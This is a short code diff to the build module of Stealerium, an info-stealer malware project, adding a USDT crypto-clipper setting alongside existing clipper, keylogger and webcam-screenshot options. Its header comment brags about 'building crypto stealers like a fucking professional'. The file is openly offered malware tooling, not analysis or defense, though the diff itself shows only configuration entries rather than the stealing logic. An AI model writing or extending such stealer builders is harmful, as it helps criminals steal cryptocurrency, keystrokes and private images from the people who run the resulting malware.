@@ -1,3 +1,16 @@
+/*
+ * Stealerium Builder - Build Module
+ * 
+ * 🔥 Enhanced by @chocolaid on GitHub
+ * 
+ * Features Added:
+ * - USDT clipper configuration support
+ * - Enhanced build process with new crypto support
+ * - Complete USDT integration in build pipeline
+ * 
+ * "Building crypto stealers like a fucking professional" 💀
+ */
+
 using Mono.Cecil;
 using Mono.Cecil.Cil;
 
@@ -19,6 +32,7 @@ internal sealed class Build
         {"ClipperBTC", ""},
         {"ClipperETH", ""},
         {"ClipperLTC", ""},
+        {"ClipperUSDT", ""},
 
         {"WebcamScreenshot", ""},
         {"Keylogger", ""},
